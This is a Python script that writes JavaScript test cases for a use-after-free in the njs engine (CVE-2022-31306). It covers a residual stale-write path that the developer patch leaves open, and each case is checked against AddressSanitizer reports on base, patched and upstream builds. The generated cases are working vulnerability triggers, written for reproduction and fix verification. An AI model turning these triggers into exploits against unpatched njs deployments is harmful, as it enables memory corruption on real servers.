"""Write the large-array JavaScript case files for njs.cve-2022-31306 (the
residual stale-reference use that the developer patch does not fix).

Usage: python3 recurdesc_big_cases.py OUTDIR

This is a second case set for the residual of njs.cve-2022-31306 (the main
set is scripts/recurdesc_cases.py). Its cases use a large fast array (20000
elements), so njs allocates array->start with the system allocator, which
AddressSanitizer poisons when njs_array_convert_to_slow_array() frees it.
The stale NJS_PROPERTY_REF that njs_object_prop_define() holds across a
descriptor getter then points into poisoned memory, and its two uses become
visible as sanitizer reports rather than the silent writes of the small-array
cases:

  - the accessor-descriptor path (family rcbig, field get) reaches the second
    njs_array_convert_to_slow_array() and reads the released start; the
    developer guard stops this, so rcbig is a report on the base build and OK
    after the patch (the reported faulty set, on a large array);
  - the data-descriptor path (family rebig, field value or writable) reaches
    the direct write *prev->value.data.u.value = prop->value at the stale
    element pointer (njs_object_prop.c), a heap-use-after-free write; the
    developer guard does not touch this path, so rebig is a report on the base
    build AND after the developer patch, and OK only at the upstream reorder
    (0.7.8 and later), which evaluates the descriptor before querying the
    target.

Each case defines index 1 of the large array with a descriptor whose field is
an accessor whose getter converts the array by Object.defineProperty on an
element (defp) or Object.freeze (freeze), then prints the array summary with
the printer of scripts/recurdesc_cases.py (length, own-index count, first six
indices by kind). The expected output is Node.js (scripts/njs_cases.py
--oracle); a case that reaches the faulty state is ASAN on the njs builds
where it is not fixed and OK where it is.
"""
import sys
from pathlib import Path

N = 20000

PRELUDE = r"""
function vstr(v) {
    var t = typeof v;
    if (t === 'function') return 'fn';
    if (v !== null && t === 'object') return Array.isArray(v) ? 'arr' : 'obj';
    return String(v);
}
function kind(a, i) {
    var d = Object.getOwnPropertyDescriptor(a, i);
    if (d === undefined) return 'hole';
    if ('value' in d) return 'v' + vstr(d.value);
    return (d.get ? 'G' : '') + (d.set ? 'S' : '') || 'A';
}
function show(a) {
    if (!(a instanceof Object)) return typeof a + ':' + String(a);
    var n = a.length, head = [], present = 0, cap = 6;
    var lim = n < cap ? n : cap;
    for (var j = 0; j < lim; j++) head.push(kind(a, j));
    for (var i = 0; i < n; i++) if (Object.prototype.hasOwnProperty.call(a, i)) present++;
    return 'len' + n + ' own' + present + ' head[' + head.join(',') + ']';
}
function out(f) { var r; try { r = show(f()); } catch (e) { r = 'E:' + e.name; } console.log(r); }
"""

CONV = {
    "defp": "Object.defineProperty(a, 1, {get: function () {}});",
    "freeze": "Object.freeze(a);",
}


def body(field, conv):
    return (
        f"var a = [];\nfor (var i = 0; i < {N}; i++) a[i] = i;\n"
        f"function g() {{ {CONV[conv]} return function () {{}}; }}\n"
        "var d = {};\n"
        f"Object.defineProperty(d, '{field}', {{get: g, configurable: true}});\n"
        f"out(function () {{ Object.defineProperty(a, 1, d); return a; }});\n"
    )


def cases():
    # accessor descriptor (reported faulty set) on a large array
    for conv in CONV:
        yield (f"rcbig_get_{conv}", "rcbig", "get", conv, 1, body("get", conv))
    # data / generic descriptor (the residual stale write) on a large array
    for field in ("value", "writable"):
        for conv in CONV:
            yield (f"rebig_{field}_{conv}", "rebig", field, conv, 0, body(field, conv))
    # control: a valid define on a large array, no reentrancy
    yield ("validbig", "valid", "value", "none", 0,
           f"var a = [];\nfor (var i = 0; i < {N}; i++) a[i] = i;\n"
           "out(function () { Object.defineProperty(a, 1, {value: 7}); return a; });\n")


def main():
    outdir = Path(sys.argv[1])
    outdir.mkdir(parents=True, exist_ok=True)
    rows = ["case\tfamily\tfield\tconv\tfaulty\tabsent"]
    for name, fam, field, conv, faulty, b in cases():
        (outdir / f"{name}.js").write_text(PRELUDE.lstrip("\n") + b)
        rows.append(f"{name}\t{fam}\t{field}\t{conv}\t{faulty}\t{'none'}")
    (outdir / "cases.tsv").write_text("\n".join(rows) + "\n")
    print(f"{len(rows) - 1} cases written to {outdir}")


if __name__ == "__main__":
    main()
